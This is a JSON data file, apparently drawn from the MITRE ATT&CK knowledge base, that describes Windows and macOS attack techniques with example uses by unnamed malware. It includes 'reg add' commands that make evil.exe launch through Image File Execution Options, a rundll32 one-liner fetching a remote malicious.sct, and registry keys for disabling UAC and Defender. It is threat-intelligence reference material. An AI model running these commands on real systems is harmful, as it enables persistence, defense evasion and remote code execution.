      "has the capability to edit the Registry.",
      "can make modifications to Registry keys.",
      "can modify the Registry to save its configuration data as the following RC4-encrypted Registry key: `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon`.",
      "has used Registry modifications as part of its installation routine.",
      "has added a registry key so future powershell.exe instances are spawned off-screen by default and has removed all registry entries that are left behind during the dropper process.",
      "can make modifications to the Regsitry for persistence.",
      "modifies several Registry keys under HKCU\\Software\\Microsoft\\Internet Explorer\\ PhishingFilter\\ to disable phishing filters.",
      "adds the configuration to the Registry in XML format.",
      "Once  has access to a network share it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy to 1.",
      "can write its configuration file to Software\\Classes\\scConfig in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER.",
      "has used malware that adds Registry keys for persistence.",
      "can write data to `HKLM\\Software\\NFC\\IPA` and `HKLM\\Software\\NFC\\` and delete Registry values.",
      "modifies conditions in the Registry and adds keys.",
      "modifies the Registry to store an encoded configuration file in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security.",
      "can set and delete Registry keys.",
      "can modify the Registry to store its configuration information in a randomly named subkey under HKCU\\Software\\Microsoft.",
      "has modified Registry settings for default file associations to enable all macros and for persistence.",
      "has modified Registry values to store encrypted orchestrator code and payloads.",
      "modifies several registry keys for persistence and UAC bypass.",
      "has overwritten registry keys for persistence.",
      "can modify registry entries.",
      "used a malware variant called GOODLUCK to modify the registry in order to steal credentials.",
      "adds a Registry value for its installation routine to the Registry Key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Enable LUA=0 and HKEY_CURRENT_USER\\Software\\DC3_FEXEC.",
      "has modified Registry settings for security tools.",
      "can delete its persistence mechanisms from the registry.",
      "has the ability to add a Class ID in the current user Registry hive to enable persistence mechanisms.",
      "has modified registry keys for persistence.",
      "sets HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load to point to its executable.",
      "can achieve persistence by modifying Registry key entries.",
      "can modify the Registry to set the ServiceDLL for a service created by the malware for persistence.",
      "can modify the Registry to store its configuration information.",
      "has modified the Registry to install a second-stage script in the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot.",
      "can set values in the Registry to help in execution.",
      "can write its configuration file to the Registry.",
      "has registered two registry keys for shim databases.",
      "A  tool has created new Registry keys under `HKEY_CURRENT_USER\\Software\\Classes\\` and `HKLM\\SYSTEM\\CurrentControlSet\\services`.",
      "can modify registry keys as part of setting a new pass-through authentication agent.",
      "can write an encrypted token to the Registry to enable processing of remote commands.",
      "has modified Registry values to store payloads.",
      "has modified registry keys to prepare for ransomware execution and to disable common administrative utilities.",
      "modifies the Registry to record the malicious listener for output from the Winlogon process.",
      "can make arbitrary changes to registry keys based on provided input.",
      "modified the victim registry to enable the `RestrictedAdmin` mode feature allowing for pass the hash behaviors to function via RDP.",
      "modifies registry values for anti-forensics and defense evasion purposes.",
      "has used `netsh` to create a PortProxy Registry modification on a compromised server running the Paessler Router Traffic Grapher (PRTG).",
      "can use the Windows Registry Environment key to change the `%windir%` variable to point to `c:\\Windows` to enable payload execution.",
      "will leverage malicious Windows batch scripts to modify registry values associated with Windows Defender functionality.",
      "can change the Registry values for Group Policy refresh time to disable SmartScreen and to disable Windows Defender.",
      "modifies the victim Registry to allow for elevated execution.",
      "has modified the following registry key to install itself as the value granting permission to install specified extensions: ` HKCU\\Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist`.",
      "modifies various registry keys associated with system logon and BitLocker functionality to effectively lock-out users following disk encryption.",
      "performed Registry modifications to escalate privileges and disable security tools.",
      "has modified the Registry to enable itself to run in safe mode to change the icons and file extensions for encrypted files and to add the malware path for persistence.",
      "has installed tools such as  by writing them to the Windows registry.",
      "can create Registry keys to bypass UAC and for persistence.",
      "writes persistent configuration information to the victim host registry.",
      "has used reg.exe to modify system configuration.",
      "modifies the victim Registry to prevent system recovery.",
      "has modified Registry keys to maintain persistence."
    ],
    "id": "T1112",
    "name": "Modify Registry",
    "similar_words": [
      "Modify Registry"
    ]
  },
  "attack-pattern--5ad95aaa-49c1-4784-821d-2e83f47b079b": {
    "description": "macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the osalang program.\nAppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. \n\nAdversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python  (Citation: Macro Malware Targets Macs). Scripts can be run from the command-line via osascript /path/to/script or osascript -e \"script here\".",
    "example_uses": [
      "uses AppleScript to create a login item for persistence."
    ],
    "id": "T1155",
    "name": "AppleScript",
    "similar_words": [
      "AppleScript"
    ]
  },
  "attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7": {
    "description": "Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill)Browser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation: Chrome Roaming Profiles)",
    "example_uses": [
      "collects information on bookmarks from Google Chrome.",
      "has a command to upload to its C2 server victim browser bookmarks.",
      "can retrieve browser history and database files.",
      "retrieves the user profile data (e.g. browsers) from Chrome and Firefox browsers.",
      "can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.",
      "has a browser info stealer module that can read Chrome and Edge browser database files.",
      "can retrieve browser history.",
      "has used Google Chrome bookmarks to identify internal resources and assets.",
      "has collected browser bookmark information to learn more about compromised hosts obtain personal information about users and acquire details about internal network resources.",
      "can collect the contents of the `%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\LocalState` file.",
      "has the ability to gather browser data such as bookmarks and visited sites.",
      "has collected browser bookmark and history information.",
      "retrieves browser histories via infostealer malware such as Raccoon Stealer.",
      "has used type \\\\<hostname>\\c$\\Users\\<username>\\Favorites\\Links\\Bookmarks bar\\Imported From IE\\*citrix* for bookmark discovery.",
      "has targeted the browsing history of network administrators.",
      "deployed malware such as YouieLoader capable of capturing victim system browser information.",
      "can collect bookmarks cookies and history from Safari.",
      "During   used the CDumper (Chrome browser) and EDumper (Edge browser) data stealers to collect cookies browsing history and credentials.",
      "During   used a Chrome data dumper named MKG.",
      "To collect data on the host's Wi-Fi connection history  reads the `/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist` file. It also utilizes Apple's `CWWiFiClient` API to scan for nearby Wi-Fi networks and obtain data on the SSID security type and RSSI (signal strength) values.",
      "collects information from Chromium-based browsers and Firefox such as cookies history downloads and extensions.",
      "has identified and gathered information from two-factor authentication extensions for multiple browsers."
    ],
    "id": "T1217",
    "name": "Browser Information Discovery",
    "similar_words": [
      "Browser Bookmark Discovery",
      "Browser Information Discovery"
    ]
  },
  "attack-pattern--62166220-e498-410f-a90a-19d4339d4e99": {
    "description": "Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\\dbg\\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as Debugger values in the Registry under HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable> where <executable> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nAn example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)\n\n* reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\n* reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\n* reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\"\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.\n\nMalware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",
    "example_uses": [],
    "id": "T1183",
    "name": "Image File Execution Options Injection",
    "similar_words": [
      "Image File Execution Options Injection"
    ]
  },
  "attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5": {
    "description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",
    "example_uses": [
      "configured its payload to inject into the rundll32.exe.",
      "uses rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”vert” = “rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez”.",
      "uses Rundll32 to load a malicious DLL.",
      "uses Rundll32 to ensure only a single instance of itself is running at once.",
      "uses Rundll32 for executing the dropper program.",
      "can use Rundll32 to execute additional payloads.",
      "uses rundll32.exe in a Registry value added to establish persistence.",
      "launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.",
      "A  variant has used rundll32 for execution.",
      "uses rundll32 within  entries to execute malicious DLLs.",
      "can load a DLL using .",
      "has a tool that can run DLLs.",
      "uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.",
      "uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.",
      "Rundll32.exe is used as a way of executing  at the command-line.",
      "uses rundll32 to call an exported function.",
      "executes functions using rundll32.exe.",
      "uses rundll32.exe to load.",
      "Variants of  have used rundll32.exe in Registry values added to establish persistence.",
      "After copying itself to a DLL file, a variant of  calls the DLL file using rundll32.exe.",
      "The  dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main  component.",
      "uses rundll32.exe to load its DLL.",
      "calls cmd.exe to run various DLL files via rundll32.",
      "is executed using rundll32.exe.",
      "has used rundll32.exe in a Registry value to establish persistence.",
      "runs its core DLL file using rundll32.exe.",
      "is installed via execution of rundll32 with an export named \"init\" or \"InitW.\"",
      "The  installer loads a DLL using rundll32.",
      "installs VNC server software that executes through rundll32.",
      "executed  by using rundll32 commands such as rundll32.exe “C:\\Windows\\twain_64.dll”.  also executed a .dll for a first stage dropper using rundll32.exe. An  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload."
    ],
    "id": "T1085",
    "name": "Rundll32",
    "similar_words": [
      "Rundll32"
    ]
  },
  "attack-pattern--62dfd1ca-52d5-483c-a84b-d6e80bf94b7b": {
    "description": "Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075).\n\nAdversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of [Masquerading](https://attack.mitre.org/techniques/T1036) that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.\n\nAdversaries may also intentionally corrupt or kill services to execute malicious recovery programs/commands. (Citation: Twitter Service Recovery Nov 2017) (Citation: Microsoft Service Recovery Feb 2013)",
    "example_uses": [
      "An  Port 22 malware variant registers itself as a service.",
      "can terminate a specific process by its process id.",
      "has batch files that modify the system service COMSysApp to load a malicious DLL.",
      "creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.",
      "can delete services from the victim’s machine.",
      "contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs.",
      "installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry.",
      "can modify service configurations."
    ],
    "id": "T1031",
    "name": "Modify Existing Service",
    "similar_words": [
      "Modify Existing Service"
    ]
  },
  "attack-pattern--64196062-5210-42c3-9a02-563a0d1797ef": {
    "description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system.(Citation: ESET Sednit USBStealer 2014) Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
    "example_uses": [
      "Part of 's operation involved using  modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.",
      "drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim.",
      "uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.",
      "Part of 's operation involved using  modules to copy itself to air-gapped machines using files written to USB sticks to transfer data and command traffic.",
      "drops commands for a second victim onto a removable media drive inserted into the first victim and commands are executed when the drive is inserted into the second victim."
    ],
    "id": "T1092",
    "name": "Communication Through Removable Media",
    "similar_words": [
      "Communication Through Removable Media"
    ]
  },
  "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196": {
    "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directorys existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
    "example_uses": [
      "can use the command-line utility cacls.exe to change file permissions."
    ],
    "id": "T1222",
    "name": "File and Directory Permissions Modification",
    "similar_words": [
      "File Permissions Modification",
      "File and Directory Permissions Modification"
    ]
  },
  "attack-pattern--66f73398-8394-4711-85e5-34c8540b22a5": {
    "description": "Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Endgame Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored. (Citation: Endgame Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow. (Citation: Endgame Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.\n\nMalicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)\n\nHooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s to conceal files, processes, Registry keys, and other objects in order to hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)",
    "example_uses": [
      "is capable of using Windows hook interfaces for information gathering such as credential access.",
      "hooks processes by modifying IAT pointers to CreateWindowEx."
    ],
    "id": "T1179",
    "name": "Hooking",
    "similar_words": [
      "Hooking"
    ]
  },
  "attack-pattern--6856ddd6-2df3-4379-8b87-284603c189c3": {
    "description": "The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
    "example_uses": [
      "is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.",
      "performs BIOS modification and can download and execute a file as well as protect itself from removal."
    ],
    "id": "T1019",
    "name": "System Firmware",
    "similar_words": [
      "System Firmware"
    ]
  },
  "attack-pattern--68c96494-1a50-403e-8844-69a6af278c68": {
    "description": "When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under HKEY_CLASSES_ROOT\\.[extension], for example HKEY_CLASSES_ROOT\\.txt. The entries point to a handler for that extension located at HKEY_CLASSES_ROOT\\[handler]. The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command. For example:\n* HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command\n* HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command\n* HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)",
    "example_uses": [],
    "id": "T1042",
    "name": "Change Default File Association",
    "similar_words": [
      "Change Default File Association"
    ]
  },
  "attack-pattern--68f7e3a1-f09f-4164-9a62-16b648a0dd5a": {
    "description": "Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)\n\nAdversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.\n\nRegsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: SubTee Regsvr32 Whitelisting Bypass) This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)",
    "example_uses": [
      "used regsvr32.exe to execute scripts.",
      "can use Regsvr32 to execute additional payloads.",
      "used Regsvr32 to bypass application whitelisting techniques.",
      "has used regsvr32 for execution.",
      "Some  versions have an embedded DLL known as MockDll that uses  and regsvr32 to execute another payload.",
      "created a  that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory.",
      "executes using regsvr32.exe called from the  persistence mechanism.",
      "variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.",
      "has used regsvr32.exe to execute a server variant of  in victim networks."
    ],
    "id": "T1117",
    "name": "Regsvr32",
    "similar_words": [
      "Regsvr32"
    ]
  },
  "attack-pattern--6a3be63a-64c5-4678-a036-03ff8fc35300": {
    "description": "Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user reboots their machine. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at ~/Library/Preferences/com.apple.loginwindow.plist and ~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist. \n\nAn adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).",
    "example_uses": [],
    "id": "T1164",
    "name": "Re-opened Applications",
    "similar_words": [
      "Re-opened Applications"
    ]
  },
  "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df": {
    "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include modifying sensor settings stored in configuration files and/or Registry keys to disable or maliciously redirect event telemetry. (Citation: Microsoft Lamin Sept 2017)\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.",
    "example_uses": [],
    "id": "T1054",
    "name": "Indicator Blocking",
    "similar_words": [
      "Indicator Blocking"
    ]
  },
  "attack-pattern--6aabc5ec-eae6-422c-8311-38d45ee9838a": {
    "description": "Adversaries may use more than one remote access tool with varying command and control protocols as a hedge against detection. If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network. (Citation: Mandiant APT1)\n\nUse of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.",
    "example_uses": [
      "used a tool called Imecab to set up a persistent remote access account on the victim machine.",
      "has used TeamViewer to preserve remote access in case control using the Cobalt Strike module was lost.",
      "has been known to use multiple backdoors per campaign.",
      "has used  via Web shell to establish redundant access. The group has also used harvested credentials to gain access to Internet-accessible resources such as Outlook Web Access, which could be used for redundant access.",
      "maintains access to victim environments by using  to access  as well as establishing a backup RDP tunnel by using .",
      "will sleep until after a date/time value loaded from a .dat file has passed. This allows the RAT to remain dormant until a set date, which could allow a means to regain access if other parts of the actors' toolset are removed from a victim.",
      "has deployed backup web shells and obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network."
    ],
    "id": "T1108",
    "name": "Redundant Access",
    "similar_words": [
      "Redundant Access"
    ]
  },
  "attack-pattern--6aac77c4-eaf2-4366-8c13-ce50ab951f38": {
    "description": "Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
    "example_uses": [
      "sends emails to victims with a malicious executable disguised as a document or spreadsheet displaying a fake icon.",
      "has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the “attachedTemplate” technique to load a template from a remote server.",
      "sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.",
      "sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.",
      "sent emails to victims with malicious Microsoft Office documents attached.",
      "used spearphishing with Microsoft Office attachments to target victims.",
      "has targeted victims with spearphishing emails containing malicious Microsoft Word documents.",
      "has attached a malicious document to an email to gain initial access.",
      "used spearphishing emails with malicious Microsoft Word attachments to infect victims.",
      "has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.",
      "has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.",
      "delivers malware using spearphishing emails with malicious HWP attachments.",
      "sent spearphishing emails containing malicious Microsoft Office attachments.",
      "has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.",
      "has used spearphishing with an attachment to deliver files with exploits to initial victims.",
      "has used spearphishing with an attachment to deliver files with exploits to initial victims.",
      "has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.",
      "has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.",
      "has sent spearphishing emails with attachments to victims as its primary initial access vector.",
      "has distributed targeted emails containing Word documents with embedded malicious macros.",
      "sent malicious attachments to victims over email, including an Excel spreadsheet containing macros to download Pupy.",
      "has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.",
      "has targeted victims using spearphishing emails with malicious Microsoft Word attachments."
    ],
    "id": "T1193",
    "name": "Spearphishing Attachment",
    "similar_words": [
      "Spearphishing Attachment"
    ]
  },
  "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5": {
    "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming) When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide) Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through kextload and kextunload commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
    "example_uses": [],
    "id": "T1215",
    "name": "Kernel Modules and Extensions",
    "similar_words": [
      "Kernel Modules and Extensions"
    ]
  },
  "attack-pattern--6c174520-beea-43d9-aac6-28fb77f3e446": {
    "description": "Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n (Citation: Graeber 2014)",
